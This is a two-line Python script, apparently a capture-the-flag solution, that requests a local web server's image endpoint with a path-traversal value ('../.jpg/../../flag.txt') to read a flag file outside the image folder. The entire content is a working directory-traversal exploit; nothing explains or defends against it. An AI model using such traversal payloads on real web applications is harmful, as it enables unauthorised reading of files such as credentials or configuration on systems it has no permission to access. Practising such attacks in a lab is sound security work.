import requests

print(requests.get("http://localhost:8000/image?image=../.jpg/../../flag.txt"))